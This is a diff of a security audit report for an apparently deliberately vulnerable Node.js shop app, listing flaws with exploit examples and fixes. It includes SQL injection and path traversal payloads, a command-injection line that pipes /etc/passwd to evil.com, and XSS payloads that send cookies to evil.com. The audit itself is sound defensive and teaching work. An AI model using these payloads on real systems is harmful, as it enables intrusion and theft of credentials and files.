@@ -14,18 +14,29 @@
 | 4 | OS Command Injection — Admin export | 🔴 Critical | `routes/admin.js` |
 | 5 | Path Traversal — Receipt file download | 🔴 Critical | `routes/orders.js` |
 | 6 | Broken Access Control — Admin panel (no auth check) | 🔴 Critical | `routes/admin.js` |
-| 7 | Broken Access Control — Order details (IDOR) | 🟠 High | `routes/orders.js` |
-| 8 | Privilege Escalation — User can set own role | 🟠 High | `routes/auth.js`, `views/profile.ejs` |
-| 9 | Stored XSS — Product reviews | 🟠 High | `routes/search.js`, `views/product.ejs` |
-| 10 | Weak Password Hashing (MD5, unsalted) | 🟠 High | `routes/auth.js` |
-| 11 | Insecure Session ID (guessable, timestamp-based) | 🟠 High | `routes/auth.js` |
-| 12 | Session Cookie Missing Security Flags | 🟡 Medium | `routes/auth.js` |
-| 13 | Cart Price Manipulation (client-trusted price) | 🟡 Medium | `routes/orders.js` |
-| 14 | Full Stack Trace & SQL Exposed to User on Error | 🟡 Medium | `server.js`, `views/error.ejs` |
-| 15 | Hardcoded Credentials in Source Code | 🟡 Medium | `db.js`, `config.js` |
-| 16 | Wildcard CORS (`Access-Control-Allow-Origin: *`) | 🟡 Medium | `server.js` |
-| 17 | No CSRF Protection on State-Changing Forms | 🟡 Medium | All routes |
-| 18 | `.env` File Committed to Repository | 🟡 Medium | `.env` |
+| 7 | Reflected XSS — Search results page | 🔴 Critical | `views/search.ejs` |
+| 8 | Stored XSS — Product reviews | 🟠 High | `views/product.ejs` |
+| 9 | Insecure Direct Object Reference (IDOR) — Order details | 🟠 High | `routes/orders.js` |
+| 10 | Privilege Escalation — User can set own role | 🟠 High | `routes/auth.js`, `views/profile.ejs` |
+| 11 | Weak Password Hashing — MD5, unsalted | 🟠 High | `routes/auth.js` |
+| 12 | Insecure Session ID — Guessable, timestamp-based | 🟠 High | `routes/auth.js` |
+| 13 | Open Redirect — Unvalidated `next` parameter | 🟠 High | `routes/auth.js` |
+| 14 | Session Not Invalidated on Logout | 🟠 High | `routes/auth.js` |
+| 15 | Cart Cookie — No Integrity Verification (Unsigned) | 🟠 High | `routes/orders.js` |
+| 16 | Cart Price Manipulation — Client-trusted price at checkout | 🟡 Medium | `routes/orders.js` |
+| 17 | Negative / Zero Quantity Abuse in Cart | 🟡 Medium | `routes/orders.js` |
+| 18 | Session Cookie Missing `HttpOnly`, `Secure`, `SameSite` Flags | 🟡 Medium | `routes/auth.js` |
+| 19 | No Rate Limiting / Brute-Force Protection on Login | 🟡 Medium | `routes/auth.js` |
+| 20 | Missing Security Headers (No Helmet) | 🟡 Medium | `server.js` |
+| 21 | Full Stack Trace & SQL Exposed to Users on Error | 🟡 Medium | `server.js`, `views/error.ejs` |
+| 22 | Hardcoded Credentials in Source Code | 🟡 Medium | `db.js` |
+| 23 | API Key Hardcoded in Source (Not in `.env`) | 🟡 Medium | `config.js` |
+| 24 | Wildcard CORS (`Access-Control-Allow-Origin: *`) | 🟡 Medium | `server.js` |
+| 25 | No CSRF Protection on State-Changing Forms | 🟡 Medium | All routes |
+| 26 | `.env` File Committed to Repository | 🟡 Medium | `.env` |
+| 27 | Session Memory Leak — Sessions Never Expire | 🟡 Medium | `routes/auth.js` |
+| 28 | Malformed Cart Cookie Crashes Middleware (DoS) | 🟡 Medium | `server.js` |
+| 29 | Known Vulnerable Dependency — Lodash 4.17.15 | 🟡 Medium | `package.json` |
 
 ---
 
@@ -35,8 +46,8 @@
 
 ### 🔴 #1 — SQL Injection: Login Bypass
 
-**File:** [`routes/auth.js`](routes/auth.js) — Line 41–42  
-**Severity:** Critical  
+**File:** `routes/auth.js` — Lines 41–43  
+**Severity:** Critical | **CWE-89** | **OWASP A03: Injection**
 
 **Vulnerable Code:**
 ```js
@@ -47,58 +58,46 @@ const user = db.get(sql);
 ```
 
 **Explanation:**  
-User-supplied `username` and `password` from the POST body are concatenated directly into a raw SQL string. An attacker can inject arbitrary SQL, completely bypassing the password check.
+User-supplied `username` and `password` from the POST body are concatenated directly into a raw SQL string.
+An attacker can inject arbitrary SQL to completely bypass the password check.
 
 **Exploit Example:**
 ```
-username: admin'--
-password: anything
+username:  admin'--
+password:  anything
 ```
-The SQL becomes:
+Resulting SQL:
 ```sql
 SELECT * FROM users WHERE username = 'admin'--' AND (password = ...)
+-- Everything after -- is a comment; password check is gone
 ```
-Everything after `--` is a SQL comment — the password clause is ignored. The attacker logs in as `admin` without knowing the password.
 
 **Correct Fix:**
 ```js
-// Use parameterised queries — NEVER concatenate user input into SQL
+// routes/auth.js — always use parameterised queries
 router.post('/login', (req, res) => {
-  const username = req.body.username;
-  const password = req.body.password;
-
-  // Look up user first, then compare password separately
-  const user = db.findUserByUsername(username);
+  const { username, password } = req.body;
+  const user = db.findUserByUsername(username); // already uses ? placeholder
   if (!user) {
-    return res.status(401).render('login', {
-      title: 'Log in',
-      error: 'Invalid username or password.',
-      next: req.body.next || '/',
-    });
+    return res.status(401).render('login', { title: 'Log in',
+      error: 'Invalid username or password.', next: req.body.next || '/' });
   }
-
-  // Compare the stored hash against the submitted password
   const hash = crypto.createHash('sha256').update(password).digest('hex');
   if (user.password !== hash) {
-    return res.status(401).render('login', {
-      title: 'Log in',
-      error: 'Invalid username or password.',
-      next: req.body.next || '/',
-    });
+    return res.status(401).render('login', { title: 'Log in',
+      error: 'Invalid username or password.', next: req.body.next || '/' });
   }
-
   startSession(res, user.id);
   res.redirect(req.body.next || '/');
 });
 ```
-> `findUserByUsername` already uses a parameterised `?` placeholder, so no injection is possible.
 
 ---
 
 ### 🔴 #2 — SQL Injection: Search
 
-**File:** [`routes/search.js`](routes/search.js) — Line 11  
-**Severity:** Critical  
+**File:** `routes/search.js` — Line 11  
+**Severity:** Critical | **CWE-89** | **OWASP A03: Injection**
 
 **Vulnerable Code:**
 ```js
@@ -107,7 +106,8 @@ const sql = "SELECT * FROM products WHERE name LIKE '%" + q + "%' OR description
 ```
 
 **Explanation:**  
-The search query `q` from `req.query.q` is directly injected into the SQL string without escaping. An attacker can break out of the LIKE clause and run arbitrary SQL — including reading the entire `users` table (passwords included).
+The `?q=` query parameter is directly concatenated into SQL. An attacker can escape the LIKE clause and run
+arbitrary SQL — including UNION attacks to dump the entire `users` table (usernames + password hashes).
 
 **Exploit Example:**
 ```
@@ -119,7 +119,6 @@ GET /search?q=%' UNION SELECT id,username,password,email,address,role FROM users
 // routes/search.js
 router.get('/search', (req, res) => {
   const q = (req.query.q || '').trim();
-  // Use a parameterised query with LIKE wildcards bound safely
   const pattern = '%' + q + '%';
   const products = q
     ? db.all('SELECT * FROM products WHERE name LIKE ? OR description LIKE ?', pattern, pattern)
@@ -132,24 +131,19 @@ router.get('/search', (req, res) => {
 
 ### 🔴 #3 — Remote Code Execution: `eval()` on Coupon Input
 
-**File:** [`routes/orders.js`](routes/orders.js) — Line 46  
-**Severity:** Critical  
+**File:** `routes/orders.js` — Line 46  
+**Severity:** Critical | **CWE-95** | **OWASP A03: Injection**
 
 **Vulnerable Code:**
 ```js
-// routes/orders.js  Lines 43-50
-router.post('/cart/coupon', (req, res) => {
-  const total = subtotalOf(readCart(req));
-  try {
-    res.json({ subtotal: total, discounted: eval(req.body.coupon) });  // ← DANGER
-  } catch (err) {
-    res.status(400).json({ error: 'That coupon code is not valid.' });
-  }
-});
+// routes/orders.js  Line 46
+res.json({ subtotal: total, discounted: eval(req.body.coupon) });
 ```
 
 **Explanation:**  
-`eval()` executes any JavaScript string as code in the server's Node.js process. Any logged-in (or anonymous) user can send an arbitrary JavaScript payload and achieve full Remote Code Execution on the server — reading files, spawning processes, exfiltrating data, etc.
+`eval()` executes any JavaScript string as live code inside the Node.js server process. Any user can POST
+an arbitrary payload to `/cart/coupon` and achieve full Remote Code Execution — reading files, spawning
+processes, exfiltrating data, or crashing the server.
 
 **Exploit Example:**
 ```bash
@@ -159,69 +153,54 @@ curl -X POST http://localhost:3000/cart/coupon \
 
 **Correct Fix:**
 ```js
-// routes/orders.js — replace eval() with a safe, explicit discount lookup
-const VALID_COUPONS = {
-  WELCOME10: 0.10,   // 10% off
-  STUDENT20: 0.20,   // 20% off
-  FREESHIP:  0.05,   // 5% off
-};
+// routes/orders.js — use a hardcoded whitelist, never eval user input
+const VALID_COUPONS = { WELCOME10: 0.10, STUDENT20: 0.20 };
 
 router.post('/cart/coupon', (req, res) => {
   const total = subtotalOf(readCart(req));
   const code  = (req.body.coupon || '').trim().toUpperCase();
   const discount = VALID_COUPONS[code];
-
-  if (discount === undefined) {
+  if (discount === undefined)
     return res.status(400).json({ error: 'That coupon code is not valid.' });
-  }
-
   res.json({ subtotal: total, discounted: total * (1 - discount) });
 });
 ```
-> Never use `eval()` / `new Function()` on user-supplied input.
 
 ---
 
 ### 🔴 #4 — OS Command Injection: Admin Export
 
-**File:** [`routes/admin.js`](routes/admin.js) — Line 22  
-**Severity:** Critical  
+**File:** `routes/admin.js` — Line 22  
+**Severity:** Critical | **CWE-78** | **OWASP A03: Injection**
 
 **Vulnerable Code:**
 ```js
-// routes/admin.js  Lines 20-26
-router.get('/admin/export', (req, res) => {
-  const name = req.query.name || 'report';
-  exec('node scripts/export-report.js ' + name, { cwd: config.projectDir }, (err, stdout, stderr) => {
-    // ...
-  });
-});
+// routes/admin.js  Line 22
+exec('node scripts/export-report.js ' + name, { cwd: config.projectDir }, ...);
 ```
 
 **Explanation:**  
-The `name` query parameter is appended directly to a shell command string and passed to `child_process.exec`. Since `exec` runs the string through a shell (`/bin/sh`), an attacker can inject shell operators to run any OS command.
+`exec()` passes the full string to `/bin/sh`. The `name` query param is appended without escaping.
+An attacker injects shell operators to run arbitrary OS commands.
 
-**Exploit Example:**
+**Exploit Examples:**
 ```
-GET /admin/export?name=report; cat /etc/passwd
-GET /admin/export?name=report && curl https://evil.com/$(whoami)
+GET /admin/export?name=report; whoami
+GET /admin/export?name=report && curl https://evil.com/$(cat /etc/passwd | base64)
 ```
 
 **Correct Fix:**
 ```js
-// routes/admin.js — use execFile with an argument array, never string concatenation
+// routes/admin.js — use execFile() with an argument array; it never invokes a shell
 const { execFile } = require('child_process');
 
 router.get('/admin/export', requireAdmin, (req, res) => {
-  // Sanitise: only allow safe alphanumeric report names
-  const rawName = (req.query.name || 'report').trim();
-  const name = rawName.replace(/[^a-zA-Z0-9_-]/g, '');   // whitelist filter
-
-  // execFile does NOT invoke a shell; array args are never interpreted as commands
-  execFile('node', ['scripts/export-report.js', name], { cwd: config.projectDir }, (err, stdout, stderr) => {
-    if (err) return res.status(500).render('error', { title: 'Export failed', message: stderr || err.message });
-    res.render('admin', { title: 'Admin dashboard', stats: dashboardStats(), result: stdout.trim(), name });
-  });
+  const name = (req.query.name || 'report').replace(/[^a-zA-Z0-9_-]/g, '');
+  execFile('node', ['scripts/export-report.js', name], { cwd: config.projectDir },
+    (err, stdout, stderr) => {
+      if (err) return res.status(500).render('error', { title: 'Export failed', message: stderr || err.message });
+      res.render('admin', { title: 'Admin dashboard', stats: dashboardStats(), result: stdout.trim(), name });
+    });
 });
 ```
 
@@ -229,47 +208,40 @@ router.get('/admin/export', requireAdmin, (req, res) => {
 
 ### 🔴 #5 — Path Traversal: Receipt File Download
 
-**File:** [`routes/orders.js`](routes/orders.js) — Lines 83–89  
-**Severity:** Critical  
+**File:** `routes/orders.js` — Lines 83–89  
+**Severity:** Critical | **CWE-22** | **OWASP A01: Broken Access Control**
 
 **Vulnerable Code:**
 ```js
 // routes/orders.js  Lines 83-89
-router.get('/orders/:id/receipt', requireLogin, (req, res) => {
-  const file = req.query.file || 'order-' + req.params.id + '.txt';
-  fs.readFile(path.join(config.receiptsDir, file), 'utf8', (err, data) => {
-    if (err) return res.status(404).render('error', { ... });
-    res.type('text').send(data);
-  });
-});
+const file = req.query.file || 'order-' + req.params.id + '.txt';
+fs.readFile(path.join(config.receiptsDir, file), 'utf8', ...);
 ```
 
 **Explanation:**  
-The `file` query parameter is joined with `config.receiptsDir` without any normalisation or validation. An attacker uses `../` sequences to escape the `receipts/` directory and read arbitrary files on the filesystem.
+`req.query.file` is joined with `config.receiptsDir` without normalisation. An attacker uses `../` sequences
+to escape the `receipts/` directory and read any file on the server filesystem.
 
-**Exploit Example:**
+**Exploit Examples:**
 ```
 GET /orders/1/receipt?file=../../.env
-GET /orders/1/receipt?file=../../../etc/passwd
 GET /orders/1/receipt?file=../../db.js
+GET /orders/1/receipt?file=../../../etc/passwd
 ```
 
 **Correct Fix:**
 ```js
 // routes/orders.js
 router.get('/orders/:id/receipt', requireLogin, (req, res) => {
-  const defaultFile = 'order-' + req.params.id + '.txt';
-  const rawFile = req.query.file || defaultFile;
+  const rawFile = req.query.file || 'order-' + req.params.id + '.txt';
+  const base    = path.resolve(config.receiptsDir);
+  const target  = path.resolve(base, rawFile);
 
-  // Resolve the absolute path and verify it stays inside receiptsDir
-  const receiptsDir = path.resolve(config.receiptsDir);
-  const resolved   = path.resolve(receiptsDir, rawFile);
-
-  if (!resolved.startsWith(receiptsDir + path.sep)) {
+  // Reject anything that escapes the receipts directory
+  if (!target.startsWith(base + path.sep)) {
     return res.status(400).render('error', { title: 'Bad request', message: 'Invalid file path.' });
   }
-
-  fs.readFile(resolved, 'utf8', (err, data) => {
+  fs.readFile(target, 'utf8', (err, data) => {
     if (err) return res.status(404).render('error', { title: 'Not found', message: 'Receipt not found.' });
     res.type('text').send(data);
   });
@@ -280,142 +252,71 @@ router.get('/orders/:id/receipt', requireLogin, (req, res) => {
 
 ### 🔴 #6 — Broken Access Control: Admin Panel Has No Authentication
 
-**File:** [`routes/admin.js`](routes/admin.js) — Lines 17–26  
-**Severity:** Critical  
+**File:** `routes/admin.js` — Lines 17–26  
+**Severity:** Critical | **CWE-862** | **OWASP A01: Broken Access Control**
 
 **Vulnerable Code:**
 ```js
-// routes/admin.js  Lines 17-26
-router.get('/admin', (req, res) =>          // ← no auth middleware at all
-  res.render('admin', { ... }));
-
-router.get('/admin/export', (req, res) => { // ← no auth middleware at all
-  ...
-});
+// routes/admin.js
+router.get('/admin', (req, res) => ...);          // zero auth
+router.get('/admin/export', (req, res) => ...);   // zero auth
 ```
 
 **Explanation:**  
-Both admin routes are completely unprotected. Any visitor — logged in or not — can access `GET /admin` and `GET /admin/export`. There is no check that the user is authenticated or that they have the `admin` role.
+Both admin routes have no middleware. Anyone — anonymous or logged-in — can access the dashboard and
+trigger the export/command-injection endpoint.
 
 **Correct Fix:**
 ```js
-// routes/admin.js — add requireLogin AND requireAdmin guards
-
+// routes/admin.js — add role-gated middleware
 function requireAdmin(req, res, next) {
   if (!req.user) return res.redirect('/login?next=/admin');
-  if (req.user.role !== 'admin') return res.status(403).render('error', {
-    title: 'Forbidden',
-    message: 'You do not have permission to access the admin area.',
-  });
+  if (req.user.role !== 'admin')
+    return res.status(403).render('error', { title: 'Forbidden', message: 'Admins only.' });
   next();
 }
 
-router.get('/admin', requireAdmin, (req, res) =>
-  res.render('admin', { title: 'Admin dashboard', stats: dashboardStats(), result: null, name: '' }));
-
-router.get('/admin/export', requireAdmin, (req, res) => {
-  // ... see fix for #4
-});
+router.get('/admin',        requireAdmin, (req, res) => ...);
+router.get('/admin/export', requireAdmin, (req, res) => ...);
 ```
 
 ---
 
-### 🟠 #7 — Insecure Direct Object Reference (IDOR): Order Details
+### 🔴 #7 — Reflected XSS: Search Results Page
 
-**File:** [`routes/orders.js`](routes/orders.js) — Lines 76–81  
-**Severity:** High  
+**File:** `views/search.ejs` — Line 11  
+**Severity:** Critical | **CWE-79** | **OWASP A03: Injection**
 
 **Vulnerable Code:**
-```js
-// routes/orders.js  Lines 76-81
-router.get('/orders/:id', requireLogin, (req, res) => {
-  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
-  if (!order) return notFound(res);
-  // ← never checks: does order.user_id === req.user.id ?
-  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
-  res.render('order', { title: 'Order #' + order.id, order: order, items: items });
-});
+```html
+<!-- views/search.ejs  Line 11 -->
+<p class="muted">Results for: <strong><%- q %></strong></p>
 ```
 
 **Explanation:**  
-The route fetches an order by its `id` parameter but never verifies that the order belongs to the currently logged-in user. Any authenticated user can view any other user's order by changing the ID in the URL.
+The search query `q` is reflected back to the page using `<%-` (raw, unescaped output). An attacker crafts
+a malicious URL and tricks a victim into clicking it. The script in the URL executes in the victim's browser
+immediately (Reflected XSS), allowing session hijacking, phishing, and more. No account needed.
 
 **Exploit Example:**
 ```
-# Logged in as 'priya' (userId=2), view rahul's order (userId=3):
-GET /orders/2
+GET /search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
 ```
 
 **Correct Fix:**
-```js
-// routes/orders.js
-router.get('/orders/:id', requireLogin, (req, res) => {
-  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
-  if (!order) return notFound(res);
-
-  // Enforce ownership — admins may bypass this check if needed
-  if (order.user_id !== req.user.id && req.user.role !== 'admin') {
-    return res.status(403).render('error', { title: 'Forbidden', message: 'That is not your order.' });
-  }
-
-  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
-  res.render('order', { title: 'Order #' + order.id, order: order, items: items });
-});
+```html
+<!-- views/search.ejs — use <%= (HTML-escaped) instead of <%- (raw) -->
+<p class="muted">Results for: <strong><%= q %></strong></p>
 ```
+> Rule: `<%-` must **only** be used for trusted, developer-controlled includes like `<%- include(...) %>`.
+> All user-supplied data must go through `<%=`.
 
 ---
 
-### 🟠 #8 — Privilege Escalation: User Can Elevate Own Role
+### 🟠 #8 — Stored XSS: Product Reviews
 
-**File:** [`routes/auth.js`](routes/auth.js) — Lines 56–59 and [`views/profile.ejs`](views/profile.ejs) — Line 12  
-**Severity:** High  
-
-**Vulnerable Code:**
-```js
-// routes/auth.js  Lines 56-59
-router.post('/profile', requireLogin, (req, res) => {
-  db.run('UPDATE users SET email = ?, address = ?, role = ? WHERE id = ?',
-    req.body.email, req.body.address, req.body.role, req.user.id);  // ← role from user input!
-  res.redirect('/profile?updated=1');
-});
-```
-
-```html
-<!-- views/profile.ejs  Line 12 -->
-<input type="hidden" name="role" value="<%= currentUser.role %>">
-```
-
-**Explanation:**  
-The `role` field is sent as a hidden form input and then written directly to the database. A user can intercept the request (e.g., with browser DevTools or Burp Suite) and change the hidden `role` field from `customer` to `admin`. The server blindly saves whatever role value it receives.
-
-**Exploit Example:**
-```bash
-curl -X POST http://localhost:3000/profile \
-  -H "Cookie: sid=<your_session>" \
-  -d "email=priya@example.com&address=Hostel+2&role=admin"
-```
-
-**Correct Fix:**
-```js
-// routes/auth.js — never accept role from the client
-router.post('/profile', requireLogin, (req, res) => {
-  // Only update fields the user is allowed to change; role is NOT one of them
-  db.run('UPDATE users SET email = ?, address = ? WHERE id = ?',
-    req.body.email, req.body.address, req.user.id);
-  res.redirect('/profile?updated=1');
-});
-```
-```html
-<!-- views/profile.ejs — remove the hidden role input entirely -->
-<!-- DELETE THIS LINE: <input type="hidden" name="role" value="<%= currentUser.role %>"> -->
-```
-
----
-
-### 🟠 #9 — Stored Cross-Site Scripting (XSS): Product Reviews
-
-**File:** [`views/product.ejs`](views/product.ejs) — Line 24  
-**Severity:** High  
+**File:** `views/product.ejs` — Line 24  
+**Severity:** High | **CWE-79** | **OWASP A03: Injection**
 
 **Vulnerable Code:**
 ```html
@@ -424,169 +325,302 @@ router.post('/profile', requireLogin, (req, res) => {
 ```
 
 **Explanation:**  
-EJS's `<%-` tag outputs raw, **unescaped** HTML. `<%=` escapes special characters. Because `review.body` is stored exactly as submitted by the user and then rendered with `<%-`, an attacker can store a JavaScript payload in a review that executes in every other visitor's browser (Stored XSS).
+Review text is stored in the database as-is and rendered with `<%-` (raw HTML). Any logged-in user can
+post a review containing a `<script>` tag that executes in every other visitor's browser permanently.
 
 **Exploit Example (review body):**
 ```html
-<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+<script>document.location='https://evil.com/?c='+document.cookie</script>
 ```
 
 **Correct Fix:**
 ```html
-<!-- views/product.ejs — use <%= (escaped) instead of <%- (raw) -->
+<!-- views/product.ejs -->
 <p><%= review.body %></p>
 ```
-> Audit every `<%-` tag across all views. Use `<%-` **only** for trusted, developer-controlled template includes (like `include('partials/header')`).
 
 ---
 
-### 🟠 #10 — Weak Password Hashing: MD5 (Unsalted)
+### 🟠 #9 — Insecure Direct Object Reference (IDOR): Order Details
 
-**File:** [`routes/auth.js`](routes/auth.js) — Line 8, 30  
-**Severity:** High  
+**File:** `routes/orders.js` — Lines 76–81  
+**Severity:** High | **CWE-639** | **OWASP A01: Broken Access Control**
+
+**Vulnerable Code:**
+```js
+// routes/orders.js  Lines 76-81
+router.get('/orders/:id', requireLogin, (req, res) => {
+  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
+  if (!order) return notFound(res);
+  // ← order.user_id is NEVER compared to req.user.id
+  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
+  res.render('order', { ... });
+});
+```
+
+**Explanation:**  
+Any authenticated user can see any other user's order by changing the numeric ID in the URL.
+
+**Exploit Example:**  
+Login as `priya` (userId=2), then visit `/orders/2` (rahul's order).
+
+**Correct Fix:**
+```js
+router.get('/orders/:id', requireLogin, (req, res) => {
+  const order = db.get('SELECT * FROM orders WHERE id = ?', req.params.id);
+  if (!order) return notFound(res);
+  if (order.user_id !== req.user.id && req.user.role !== 'admin')
+    return res.status(403).render('error', { title: 'Forbidden', message: 'That is not your order.' });
+  const items = db.all('SELECT * FROM order_items WHERE order_id = ?', order.id);
+  res.render('order', { title: 'Order #' + order.id, order, items });
+});
+```
+
+---
+
+### 🟠 #10 — Privilege Escalation: User Can Set Own Role
+
+**File:** `routes/auth.js` — Lines 56–59 and `views/profile.ejs` — Line 12  
+**Severity:** High | **CWE-269** | **OWASP A01: Broken Access Control**
+
+**Vulnerable Code:**
+```js
+// routes/auth.js  Lines 56-59
+router.post('/profile', requireLogin, (req, res) => {
+  db.run('UPDATE users SET email = ?, address = ?, role = ? WHERE id = ?',
+    req.body.email, req.body.address, req.body.role, req.user.id); // role from POST body!
+});
+```
+```html
+<!-- views/profile.ejs  Line 12 -->
+<input type="hidden" name="role" value="<%= currentUser.role %>">
+```
+
+**Explanation:**  
+The `role` field is a hidden input. A user can intercept the request in DevTools or Burp and change
+`role=customer` to `role=admin`. The server saves whatever it receives with no validation.
+
+**Exploit Example:**
+```bash
+curl -X POST http://localhost:3000/profile \
+  -H "Cookie: sid=<your_session>" \
+  -d "email=x@x.com&address=Hostel&role=admin"
+# User is now admin
+```
+
+**Correct Fix:**
+```js
+// routes/auth.js — strip role from accepted fields entirely
+router.post('/profile', requireLogin, (req, res) => {
+  db.run('UPDATE users SET email = ?, address = ? WHERE id = ?',
+    req.body.email, req.body.address, req.user.id);
+  res.redirect('/profile?updated=1');
+});
+```
+```html
+<!-- views/profile.ejs — remove the hidden role input completely -->
+```
+
+---
+
+### 🟠 #11 — Weak Password Hashing: MD5, Unsalted
+
+**File:** `routes/auth.js` — Lines 8, 30  
+**Severity:** High | **CWE-916** | **OWASP A02: Cryptographic Failures**
 
 **Vulnerable Code:**
 ```js
 // routes/auth.js  Line 8
 const md5 = (text) => crypto.createHash('md5').update(text).digest('hex');
 
-// Line 30 — password stored as md5 hash
-db.run('INSERT INTO users (...) VALUES (?, ?, ?, ?, ?)',
-  username, md5(password), ...);
+// Line 30 — stored on registration
+db.run('INSERT INTO users (...) VALUES (?, ?, ?, ?, ?)', username, md5(password), ...);
 ```
 
 **Explanation:**  
-MD5 is a fast, cryptographically broken hashing algorithm with no salt. Because it is deterministic and fast, attackers can:
-- Look up hashes in pre-computed rainbow tables.
-- Crack millions of hashes per second with a GPU.
+MD5 is a fast, cryptographically broken hash. Without a salt, identical passwords produce identical hashes,
+allowing rainbow-table lookups. Modern GPUs can crack billions of MD5 hashes per second.
 
 **Correct Fix:**
 ```js
-// Install bcrypt:  npm install bcrypt
+// npm install bcrypt
 const bcrypt = require('bcrypt');
 const SALT_ROUNDS = 12;
 
-// When registering:
-router.post('/register', async (req, res) => {
-  const { username, password, email, address } = req.body;
-  if (!username || !password) { /* ... */ }
-  if (db.findUserByUsername(username)) { /* ... */ }
+// Registration:
+const hash = await bcrypt.hash(password, SALT_ROUNDS);
+db.run('INSERT INTO users (...) VALUES (?, ?, ?, ?, ?)', username, hash, ...);
 
-  const hash = await bcrypt.hash(password, SALT_ROUNDS);
-  const info = db.run('INSERT INTO users (username, password, email, address, role) VALUES (?, ?, ?, ?, ?)',
-    username, hash, email || '', address || '', 'customer');
-  startSession(res, info.lastInsertRowid);
-  res.redirect('/profile');
-});
-
-// When logging in:
-router.post('/login', async (req, res) => {
-  const user = db.findUserByUsername(req.body.username);
-  if (!user || !(await bcrypt.compare(req.body.password, user.password))) {
-    return res.status(401).render('login', { title: 'Log in', error: 'Invalid username or password.', next: req.body.next || '/' });
-  }
-  startSession(res, user.id);
-  res.redirect(req.body.next || '/');
-});
+// Login:
+if (!(await bcrypt.compare(req.body.password, user.password))) { /* reject */ }
 ```
 
 ---
 
-### 🟠 #11 — Insecure Session ID (Guessable, Timestamp-Based)
+### 🟠 #12 — Insecure Session ID: Guessable, Timestamp-Based
 
-**File:** [`routes/auth.js`](routes/auth.js) — Lines 11–13  
-**Severity:** High  
+**File:** `routes/auth.js` — Lines 11–13  
+**Severity:** High | **CWE-330** | **OWASP A07: Identification & Auth Failures**
 
 **Vulnerable Code:**
 ```js
 // routes/auth.js  Lines 11-13
 function startSession(res, userId) {
-  const sid = String(Date.now()) + '-' + userId;  // e.g. "1728978462123-2"
-  sessions[sid] = { userId: userId, createdAt: Date.now() };
+  const sid = String(Date.now()) + '-' + userId; // e.g. "1728978462123-2"
+  sessions[sid] = { userId, createdAt: Date.now() };
   res.cookie('sid', sid);
 }
 ```
 
 **Explanation:**  
-The session ID is composed of a millisecond timestamp and the numeric user ID — both of which are predictable or observable. An attacker who knows (or can guess) approximately when a victim logged in, and knows or can enumerate their user ID, can trivially forge a valid `sid` cookie.
+The session ID is a millisecond timestamp concatenated with the user's numeric ID — both of which are
+either observable or trivially guessable. An attacker who roughly knows when a victim logged in can
+enumerate valid session IDs in seconds.
 
 **Correct Fix:**
 ```js
-// routes/auth.js — use cryptographically random session IDs
+// Use 256 bits of cryptographically secure randomness
 function startSession(res, userId) {
-  const sid = crypto.randomBytes(32).toString('hex');  // 256 bits of entropy
-  sessions[sid] = { userId: userId, createdAt: Date.now() };
-  res.cookie('sid', sid, {
-    httpOnly: true,
-    sameSite: 'lax',
-    // secure: true,   // uncomment when serving over HTTPS
-    maxAge: 8 * 60 * 60 * 1000,  // 8 hours
-  });
+  const sid = crypto.randomBytes(32).toString('hex');
+  sessions[sid] = { userId, createdAt: Date.now() };
+  res.cookie('sid', sid, { httpOnly: true, sameSite: 'lax', maxAge: 8 * 60 * 60 * 1000 });
 }
 ```
 
 ---
 
-### 🟡 #12 — Session Cookie Missing `HttpOnly`, `Secure`, `SameSite` Flags
+### 🟠 #13 — Open Redirect: Unvalidated `next` Parameter
 
-**File:** [`routes/auth.js`](routes/auth.js) — Line 13  
-**Severity:** Medium  
+**File:** `routes/auth.js` — Lines 17, 48  
+**Severity:** High | **CWE-601** | **OWASP A01: Broken Access Control**
 
 **Vulnerable Code:**
 ```js
-// routes/auth.js  Line 13
-res.cookie('sid', sid);   // no flags set
+// routes/auth.js  Line 17 — adds next to URL when redirecting to login
+res.redirect('/login?next=' + encodeURIComponent(req.originalUrl));
+
+// Line 48 — after login, redirects to whatever next says — including external URLs
+res.redirect(req.body.next || '/');
+```
+```html
+<!-- views/login.ejs  Line 10 — next is stored in a hidden form field -->
+<input type="hidden" name="next" value="<%= next %>">
 ```
 
 **Explanation:**  
-Without `HttpOnly`, the session cookie is accessible via `document.cookie` in JavaScript — making it trivially stealable by any XSS payload. Without `SameSite`, the cookie is sent with cross-site requests (CSRF risk). Without `Secure`, the cookie may be transmitted over plain HTTP.
+The `next` value is taken from the query string, placed in a hidden form input, and then used as the
+redirect destination after login — with no validation. An attacker sends a phishing link like:
+
+```
+http://localhost:3000/login?next=https://evil.com/fake-campus-login
+```
+After the victim successfully logs in, they are silently bounced to `evil.com` (credential-harvesting page).
 
 **Correct Fix:**
 ```js
-// See fix in #11 above — same cookie options apply
-res.cookie('sid', sid, {
-  httpOnly: true,   // not readable by JavaScript
-  sameSite: 'lax', // not sent on cross-origin POSTs
-  // secure: true,  // only over HTTPS
-  maxAge: 8 * 60 * 60 * 1000,
+// routes/auth.js — only allow relative paths (starting with /)
+function isSafeRedirect(url) {
+  return typeof url === 'string' && url.startsWith('/') && !url.startsWith('//');
+}
+
+// On login POST:
+const next = isSafeRedirect(req.body.next) ? req.body.next : '/';
+res.redirect(next);
+```
+
+---
+
+### 🟠 #14 — Session Not Invalidated on Logout (Server-Side)
+
+**File:** `routes/auth.js` — Line 51  
+**Severity:** High | **CWE-613** | **OWASP A07: Identification & Auth Failures**
+
+**Vulnerable Code:**
+```js
+// routes/auth.js  Line 51
+router.post('/logout', (req, res) => res.clearCookie('sid').redirect('/'));
+// sessions[sid] is NEVER deleted — the server still accepts the old token
+```
+
+**Explanation:**  
+Logging out only removes the cookie from the browser. The `sessions` object on the server still holds the
+session entry. If an attacker has captured the `sid` value (e.g. via XSS or network sniffing before TLS),
+they can continue using that session indefinitely after the victim has "logged out".
+
+**Correct Fix:**
+```js
+// routes/auth.js
+router.post('/logout', (req, res) => {
+  const sid = req.cookies.sid;
+  if (sid) delete sessions[sid];          // ← invalidate server-side
+  res.clearCookie('sid').redirect('/');
 });
 ```
 
 ---
 
-### 🟡 #13 — Cart Price Manipulation (Client-Trusted Price at Checkout)
+### 🟠 #15 — Cart Cookie Has No Integrity Verification (Unsigned Cookie)
 
